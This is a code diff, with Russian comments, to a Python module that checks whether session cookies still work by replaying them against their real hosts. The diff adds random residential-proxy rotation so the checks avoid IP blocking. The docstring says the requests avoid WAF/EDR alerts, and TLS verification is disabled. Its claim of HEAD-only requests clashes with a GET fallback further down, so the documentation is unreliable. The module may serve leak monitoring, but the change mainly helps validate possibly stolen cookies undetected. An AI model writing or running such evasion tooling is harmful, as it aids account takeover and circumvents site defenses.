@@ -8,6 +8,8 @@
 """
 import json
 import logging
+import os
+import random
 import re
 import socket
 import zipfile
@@ -49,6 +51,16 @@ _USER_AGENT = "Mozilla/5.0 (compatible; security-monitor/1.0)"
 
 # Маска для cookie-значений в payload событий
 _MASK_MIN_LEN = 12
+
+# Ротация residential-прокси: COOKIE_PROXY_LIST=http://u:p@host:port,http://...
+_PROXY_LIST: list[str] = [
+    p.strip() for p in os.environ.get("COOKIE_PROXY_LIST", "").split(",") if p.strip()
+]
+
+
+def _pick_proxy() -> str | None:
+    """Случайный прокси из списка или None если список пустой."""
+    return random.choice(_PROXY_LIST) if _PROXY_LIST else None
 
 
 # ──────────────────────────────────────────────
@@ -219,6 +231,9 @@ def _check_cookie_alive(host: str, name: str, value: str, path: str = "/") -> di
     HEAD-запрос не изменяет состояние сервера и не генерирует алертов в WAF/EDR.
     Никогда не выполняет GET/POST — только HEAD.
 
+    При наличии COOKIE_PROXY_LIST запросы идут через случайный residential-прокси,
+    что исключает блокировку по IP дата-центра.
+
     Возвращает:
         {"alive": bool, "status_code": int, "reason": str}
     """
@@ -226,11 +241,15 @@ def _check_cookie_alive(host: str, name: str, value: str, path: str = "/") -> di
     clean_host = host.lstrip(".")
     url = f"https://{clean_host}{path}"
 
+    proxy = _pick_proxy()
+    proxy_kwargs = {"proxies": {"all://": proxy}} if proxy else {}
+
     try:
         with httpx.Client(
             timeout=_HEAD_TIMEOUT,
             follow_redirects=False,
             verify=False,  # не блокируем на самоподписанных сертификатах
+            **proxy_kwargs,
         ) as client:
             resp = client.head(
                 url,
@@ -259,6 +278,7 @@ def _check_cookie_alive(host: str, name: str, value: str, path: str = "/") -> di
                     timeout=_HEAD_TIMEOUT,
                     follow_redirects=False,
                     verify=False,
+                    **proxy_kwargs,
                 ) as client2:
                     resp2 = client2.get(
                         url,
